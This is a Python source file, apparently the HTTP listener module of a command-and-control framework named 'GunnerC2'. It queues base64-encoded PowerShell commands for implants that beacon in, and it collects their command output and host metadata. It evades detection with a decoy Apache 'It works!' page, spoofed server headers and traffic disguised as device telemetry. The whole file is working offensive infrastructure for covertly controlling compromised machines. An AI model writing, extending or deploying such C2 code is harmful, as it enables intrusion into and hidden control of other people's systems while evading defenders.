import logging
logger = logging.getLogger(__name__)

import json
import base64
import re
import queue
import time
import traceback, binascii
import random
import string
import os
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
from socketserver import ThreadingMixIn
from core import utils
from core.session_handlers import session_manager
from core.print_override import set_output_context
from core import print_override
from core.session_handlers.session_manager import kill_http_session
from core.listeners.base import create_listener, socket_to_listener, listeners as listener_registry
from core.malleable_c2.malleable_c2 import parse_malleable_profile
from core.malleable_c2.profile_loader import _extract_payload_from_msg
from core.prompt_manager import prompt_manager

from colorama import init, Fore, Style
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
reset = Style.RESET_ALL

PROMPT = brightblue + "GunnerC2 > " + brightblue

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
	daemon_threads = True


def _serve_benign(self):
	"""
	Send back a minimal HTML page *with* typical Apache-style headers
	so casual inspection looks like any other PHP site.
	"""
	self.send_response(200)
	# Standard date & server
	self.send_header("Date",    self.date_time_string())
	self.send_header("Server",  "Apache/2.4.41 (Ubuntu)")
	# Keep-alive looks normal
	self.send_header("Connection", "close")
	# Typical text/html PHP response
	self.send_header("Content-Type", "text/html; charset=UTF-8")
	self.end_headers()
	# A trivial “not found”-style body (you can swap in your own index.php HTML)
	self.wfile.write(b"""
<html>
 <head><title>Welcome</title></head>
 <body>
	 <h1>It works!</h1>
	 <p>Apache/2.4.41 Server at example.com Port 80</p>
 </body>
</html>
""")

class C2HTTPRequestHandler(BaseHTTPRequestHandler):
	RARE_HEADERS = [
		"X-Correlation-ID",
		"X-Request-ID",
		"X-Custom-Context",
		"X-Worker-Name",
		"X-Data-Context",
		"X-Trace-ID",
	]

	def _select_profile(self, listener):
		"""
		Look for one of our RARE_HEADERS in the incoming request.
		If found and listener.profiles contains that name, parse & return
		that profile.  Otherwise return the static listener.profile.
		"""
		profs = getattr(listener, "profiles", {}) or {}
		for hdr in self.RARE_HEADERS:
			val = self.headers.get(hdr)
			if val and val in profs:
				profile = profs[val]
				#parsed = parse_malleable_profile(path)
				if profile:
					return profile
		# fallback to whatever the listener was started with
		return None

	def _load_profile_block(self, name):
		"""Helper to grab the named block ('http-get' or 'http-post')"""
		lid      = socket_to_listener[self.server.socket.fileno()]
		profile  = listener_registry[lid].profile
		return profile.get_block(name) if profile else {}

	def _apply_server_headers(self, server_block):
		for hdr, val in server_block.get("headers", {}).items():
			self.send_header(hdr, val)

	def do_GET(self):
		try:
			lid = socket_to_listener.get(self.server.socket.fileno())
			listener = listener_registry[lid]
			profile = self._select_profile(listener)
			#print(f"RAW REQUEST: {self.requestline}")

			if profile:
				http_get = profile.get_block("http-get")
				expected_uri = http_get.get("uri", "/")
				path = self.path.split("?", 1)[0]

				if path != expected_uri:
					return _serve_benign(self)

				# extract our SID (same as before)…
				sid = None
				for hdr in ("X-Session-ID", "X-API-KEY", "X-Forward-Key"):
					sid = self.headers.get(hdr)
					if sid:
						break
				if not sid:
					return _serve_benign(self)

				# handle new session / dead session exactly as you had it…
				if sid in session_manager.dead_sessions:
					self.send_response(410, "Gone")
					self.end_headers()
					return

				if sid not in session_manager.sessions:
					if getattr(self.server, "scheme", "http") == "https":
						session_manager.register_https_session(sid)
						msg = f"[+] New HTTPS agent: {sid}"
						utils.echo(msg,
							to_console=False,
							to_op=None,
							world_wide=True,
							color=brightgreen,
							_raw_printer=print_override._orig_print,
							end='\n')
					else:
						session_manager.register_http_session(sid)
						msg = f"[+] New HTTP agent: {sid}"
						utils.echo(msg,
							to_console=False,
							to_op=None,
							world_wide=True,
							color=brightgreen,
							_raw_printer=print_override._orig_print,
							end='\n')

				session = session_manager.sessions[sid]

				lid = socket_to_listener.get(self.server.socket.fileno())
				if lid:
					listener_registry[lid].sessions.append(sid)

				# queue up your commands exactly as before…
				try:
					cmd_b64 = session.meta_command_queue.get_nowait()
					session.last_cmd_type = "meta"
					logger.debug(brightblue + f"SET MODE TO METADATA COLLECTING METADATA FOR SID {sid}" + reset)

				except queue.Empty:
					# round-robin / first-come: only one operator’s command this beacon
					super_cmd_parts = []
					picked_op = None
					for op_id, q in list(session.merge_command_queue.items()):
						try:
							cmd_b64 = q.get_nowait()
							# wrap only this one
							super_cmd_parts.append(f"""
								Write-Output "__OP__{op_id}__";
								{base64.b64decode(cmd_b64).decode("utf-8", errors="ignore")}
								Write-Output "__ENDOP__{op_id}__";
							""")
							session.last_cmd_type = "cmd"
							picked_op = op_id
							#break
						except queue.Empty:
							continue

					if picked_op:
						combined = "\n".join(super_cmd_parts)
						logger.debug(f"EXECUTING COMMAND: {combined}")
						cmd_b64 = base64.b64encode(combined.encode("utf-8")).decode("utf-8")
						#del super_cmd_parts[0]
					else:
						cmd_b64 = ""

				server_out = http_get.get("server", {}).get("output", {})
				envelope = server_out.get("envelope")
				mapping  = server_out.get("mapping")
				if envelope and mapping:
					# recursively replace every "{{payload}}" with our base64 cmd
					def _render(obj):
						if obj == "{{payload}}":
							return cmd_b64
						if isinstance(obj, dict):
							return {k: _render(v) for k, v in obj.items()}
						return obj
					payload_dict = _render(mapping)
					payload = json.dumps(payload_dict).encode()

				self.send_response(200)

				# apply server.headers from the dynamic profile
				self._apply_server_headers(http_get.get("server", {}))

				if not any("Content-Type" in h for h in http_get.get("server", {}).get("headers", [])):
					self.send_header("Content-Type", "application/json; charset=UTF-8")

				self.send_header("Date",    self.date_time_string())
				self.send_header("Server",  "Apache/2.4.41 (Ubuntu)")
				self.send_header("Content-Length", str(len(payload)))
				self.end_headers()
				self.wfile.write(payload)

			else:
				headers = self.headers

				# only treat / or *.php as our C2 endpoint
				path = self.path.split('?', 1)[0].lower()
				if not (path == '/' or path.endswith('.php')):
					return _serve_benign(self)

				# pull session‐ID from any of our three headers
				sid = None
				for hdr in ("X-Session-ID", "X-API-KEY", "X-Forward-Key"):
					sid = self.headers.get(hdr)
					if sid:
						break

				if not sid:
					# no C2 header → normal browser GET
					return _serve_benign(self)

				if sid and sid in session_manager.dead_sessions:
					# 410 Gone tells the implant “never come back”
					self.send_response(410, "Gone")
					self.end_headers()
					return

				if sid not in session_manager.sessions:
					if getattr(self.server, "scheme", "http") == "https":
						session_manager.register_https_session(sid)
						msg = f"[+] New HTTPS agent: {sid}"
						utils.echo(msg,
							to_console=False,
							to_op=None,
							world_wide=True,
							color=brightgreen,
							_raw_printer=print_override._orig_print,
							end='\n')
					else:
						session_manager.register_http_session(sid)
						msg = f"[+] New HTTP agent: {sid}"
						utils.echo(msg,
							to_console=False,
							to_op=None,
							world_wide=True,
							color=brightgreen,
							_raw_printer=print_override._orig_print,
							end='\n')

				session = session_manager.sessions[sid]

				lid = socket_to_listener.get(self.server.socket.fileno())
				if lid:
					listener_registry[lid].sessions.append(sid)

				try:
					cmd_b64 = session.meta_command_queue.get_nowait()
					session.last_cmd_type = "meta"

				except queue.Empty:
					super_cmd_parts = []
					picked_op = None
					for op_id, q in list(session.merge_command_queue.items()):
						try:
							cmd_b64 = q.get_nowait()
							# wrap only this one
							super_cmd_parts.append(f"""
								Write-Output "__OP__{op_id}__";
								{base64.b64decode(cmd_b64).decode("utf-8", errors="ignore")}
								Write-Output "__ENDOP__{op_id}__";
							""")
							session.last_cmd_type = "cmd"
							picked_op = op_id
							#break
						except queue.Empty:
							continue

					if picked_op:
						combined = "\n".join(super_cmd_parts)
						logger.debug(f"EXECUTING COMMAND: {combined}")
						cmd_b64 = base64.b64encode(combined.encode("utf-8")).decode("utf-8")
						#del super_cmd_parts[0]
					else:
						cmd_b64 = ""

				payload_dict = {
					"cmd": cmd_b64,
					"DeviceTelemetry": {
						"Telemetry": cmd_b64
					}
				}

				payload = json.dumps(payload_dict).encode()
				self.send_response(200)
				# mimic a JSON-API content type
				self.send_header("Date",    self.date_time_string())
				self.send_header("Server",  "Apache/2.4.41 (Ubuntu)")
				self.send_header("Connection", "close")
				self.send_header("Content-Type",   "application/json; charset=UTF-8")
				self.send_header("Content-Length", str(len(payload)))
				self.end_headers()
				self.wfile.write(payload)

		except (ConnectionResetError, BrokenPipeError):
			print(brightred + f"[!] Connection reset during GET request")

		except Exception as e:
			print(brightred + f"[!] Exception in do_GET: {e}")

	def do_POST(self):
		try:
			lid      = socket_to_listener.get(self.server.socket.fileno())
			listener = listener_registry[lid]

			# dynamically pick profile per-request
			profile = self._select_profile(listener)

			if profile:
				http_post     = profile.get_block("http-post")
				expected_uri  = http_post.get("uri", "/")
				path          = self.path.split("?", 1)[0]
				if path != expected_uri:
					return _serve_benign(self)

				# pull session‐ID from any of our three headers
				sid = None
				for hdr in ("X-Session-ID", "X-API-KEY", "X-Forward-Key"):
					sid = self.headers.get(hdr)
					if sid:
						break

				if not sid:
					# no C2 header → normal browser POST
					return _serve_benign(self)

				length = int(self.headers.get("Content-Length", 0))
				body = self.rfile.read(length)

				try:
					try:
						msg = json.loads(body)
						#print(f"[DEBUG] Parsed JSON: {msg}")

					except json.JSONDecodeError as e:
						print(f"[!] JSON decode error: {e}")
						self.send_response(400)
						self.end_headers()
						return

					# pull our client-output mapping from the profile
					post_client = http_post.get("client", {}) or {}
					out_cfg     = post_client.get("output", {}) or {}
					mapping     = out_cfg.get("mapping", {})

					output_b64 = _extract_payload_from_msg(msg, mapping)

					try:
						output = base64.b64decode(output_b64).decode("utf-8", "ignore").strip()

					except (TypeError, binascii.Error) as e:
						# either raw was None or invalid base64
						output = ""

					except Exception as e:
						print("Failed to decode base64")

					session = session_manager.sessions[sid]


					"""cwd = msg.get("cwd")
					user = msg.get("user")
					host = msg.get("host")

					if cwd: session.metadata["cwd"] = cwd
					if user: session.metadata["user"] = user
					if host: session.metadata["hostname"] = host"""

					# Handle OS detection first
					last_mode = session.last_cmd_type
					if last_mode == "meta":
						if session.mode == "detect_os":
							#print(f"[DEBUG] HTTP agent {sid} OS check: {output}")
							session.detect_os(output)

							# Queue OS-specific metadata commands
							for _, cmd in session.os_metadata_commands:
								encoded_meta_command = base64.b64encode(cmd.encode()).decode()
								session.meta_command_queue.put(encoded_meta_command)

							session.mode = "metadata"
							session.metadata_stage = 0
							self.send_response(200)
							self.send_header("Content-Length", "0")
							self.end_headers()
							return

						# Handle metadata collection
						if session.metadata_stage == 2:
							session.metadata_stage += 1
							session.mode = "cmd"


						if session.metadata_stage < len(session.metadata_fields):
							field = session.metadata_fields[session.metadata_stage]
							lines = [
								line.strip()
								for line in output.splitlines()
								if line.strip() not in ("$", "#", ">") and line.strip() != ""
							]

							if len(lines) > 1:
								clean = lines[1] if lines else ""
								session.metadata[field] = clean
								session.metadata_stage += 1

							elif len(lines) == 1:
								clean = lines[0] if lines else ""
								session.metadata[field] = clean
								session.metadata_stage += 1

							else:
								pass
							#print(brightred + f"[!] Failed to execute metadata collecting commands!")

						else:
							session.mode = "cmd"
							last_mode = "cmd"
							session.collection = 1

					elif last_mode == "cmd":
						if output_b64:
							pattern = re.compile(r"__OP__(?P<op>[^_]+)__(?P<out>.*?)__ENDOP__(?P=op)__", re.DOTALL)
							decoded = base64.b64decode(output_b64).decode("utf-8", "ignore").strip()
							for m in pattern.finditer(decoded):
								#print(f"FOUND m in PATTERN: {m}")
								op = m.group("op")
								out = m.group("out").strip()
								#print(f"FOUND OPERATOR: {op}")
								#print(f"FOUND OUTPUT: {out}")
								"""if op != "console":
									utils.echo(out,
										to_console=False,
										to_op=op,
										world_wide=False,
										color=False,
										_raw_printer=print_override._orig_print,
										end='\n')

								else:
									utils.echo(out,
									to_console=True,
									to_op=False,
									world_wide=False,
									color=False,
									_raw_printer=print_override._orig_print,
									end='\n')"""

								session.merge_response_queue.setdefault(op, queue.Queue())
								session.merge_response_queue[op].put(base64.b64encode(out.encode()).decode())


					else:
						pass

					#session.last_cmd_type = None

					self.send_response(200)
					self._apply_server_headers(http_post.get("server", {}))
					self.send_header("Content-Type", "application/json; charset=UTF-8")
					self.send_header("Content-Length", "0")
					self.send_header("Connection", "close")
					self.end_headers()

				except Exception as e:
					print(f"error: {e}")
					print("HIT 400 ERROR")
					self.send_response(400)
					self.end_headers()

			else:
				# only treat / or *.php as our C2 endpoint
				path = self.path.split('?', 1)[0].lower()
				if not (path == '/' or path.endswith('.php')):
					return _serve_benign(self)

				# pull session‐ID from any of our three headers
				sid = None
				for hdr in ("X-Session-ID", "X-API-KEY", "X-Forward-Key"):
					sid = self.headers.get(hdr)
					if sid:
						break

				if not sid:
					# no C2 header → normal browser POST
					return _serve_benign(self)

				length = int(self.headers.get("Content-Length", 0))
				body = self.rfile.read(length)

				try:
					try:
						msg = json.loads(body)
						#print(f"[DEBUG] Parsed JSON: {msg}")

					except json.JSONDecodeError as e:
						print(f"[!] JSON decode error: {e}")
						self.send_response(400)
						self.end_headers()
						return

					output_b64 = msg.get("output", "") or ""

					try:
						output = base64.b64decode(output_b64).decode("utf-8", "ignore").strip()

					except (TypeError, binascii.Error) as e:
						# either raw was None or invalid base64
						output = ""

					except Exception as e:
						print("Failed to decode base64")

					session = session_manager.sessions[sid]


					"""cwd = msg.get("cwd")
					user = msg.get("user")
					host = msg.get("host")

					if cwd: session.metadata["cwd"] = cwd
					if user: session.metadata["user"] = user
					if host: session.metadata["hostname"] = host"""

					# Handle OS detection first
					last_mode = session.last_cmd_type
					if last_mode == "meta":
						if session.mode == "detect_os":
							#print(f"[DEBUG] HTTP agent {sid} OS check: {output}")
							session.detect_os(output)

							# Queue OS-specific metadata commands
							for _, cmd in session.os_metadata_commands:
								encoded_meta_command = base64.b64encode(cmd.encode()).decode()
								session.meta_command_queue.put(encoded_meta_command)

							session.mode = "metadata"
							session.metadata_stage = 0
							self.send_response(200)
							self.send_header("Content-Length", "0")
							self.end_headers()
							return

						# Handle metadata collection
						if session.metadata_stage == 2:
							session.metadata_stage += 1

						if session.metadata_stage < len(session.metadata_fields):
							field = session.metadata_fields[session.metadata_stage]
							lines = [
								line.strip()
								for line in output.splitlines()
								if line.strip() not in ("$", "#", ">") and line.strip() != ""
							]

							if len(lines) > 1:
								clean = lines[1] if lines else ""
								session.metadata[field] = clean
								session.metadata_stage += 1

							elif len(lines) == 1:
								clean = lines[0] if lines else ""
								session.metadata[field] = clean
								session.metadata_stage += 1

							else:
								pass
							#print(brightred + f"[!] Failed to execute metadata collecting commands!")

						else:
							session.mode = "cmd"
							last_mode = "cmd"
							session.collection = 1

					elif last_mode == "cmd":
						if output_b64:
							pattern = re.compile(r"__OP__(?P<op>[^_]+)__(?P<out>.*?)__ENDOP__(?P=op)__", re.DOTALL)
							decoded = base64.b64decode(output_b64).decode("utf-8", "ignore").strip()
							for m in pattern.finditer(decoded):
								#print(f"FOUND m in PATTERN: {m}")
								op = m.group("op")
								out = m.group("out").strip()

								session.merge_response_queue.setdefault(op, queue.Queue())
								session.merge_response_queue[op].put(base64.b64encode(out.encode()).decode())

					else:
						pass

					#session.last_cmd_type = None

					self.send_response(200)
					self.send_header("Content-Length", "0")
					self.end_headers()

				except Exception as e:
					print(f"error: {e}")
					print("HIT 400 ERROR")
					self.send_response(400)
					self.end_headers()

		except (ConnectionResetError, BrokenPipeError):
			print(brightred + f"[!] Connection reset during POST request")

		except Exception as e:
			print(brightred + f"[!] Exception in do_POST: {e}")
			self.send_response(400)
			self.end_headers()

	def log_message(self, *args):
		return

def start_http_listener(ip, port, to_console=True, op_id=None, profile_path=None):
	if to_console:
		set_output_context(to_console=True)
		print_type = "console"

	elif op_id:
		set_output_context(to_console=False, to_op=op_id)
		print_type = "operator"

	try:
		#sys.stdout.write(PROMPT)
		#sys.stdout.flush()
		prof = None
		if profile_path:
			prof = parse_malleable_profile(profile_path)
			if not prof:
				return False

		httpd = ThreadingHTTPServer((ip, port), C2HTTPRequestHandler)
		utils.http_listener_sockets[f"http-{ip}:{port}"] = httpd
		listener_obj = create_listener(ip, port, "http")
		listener_obj.profile = prof
		socket_to_listener[ httpd.socket.fileno() ] = listener_obj.id
		if prof:
			print(brightyellow + f"[+] HTTP listener started on {ip}:{port} Using profile {prof}")

		else:
			print(brightyellow + f"[+] HTTP listener started on {ip}:{port}")

		httpd.serve_forever()

	except (ConnectionResetError, BrokenPipeError):
			print(brightred + f"[!] Connection reset from one of your agents!")

def generate_http_session_id():
	parts = []
	for _ in range(3):
		parts.append(''.join(random.choices(string.ascii_lowercase + string.digits, k=5)))
	return '-'.join(parts)
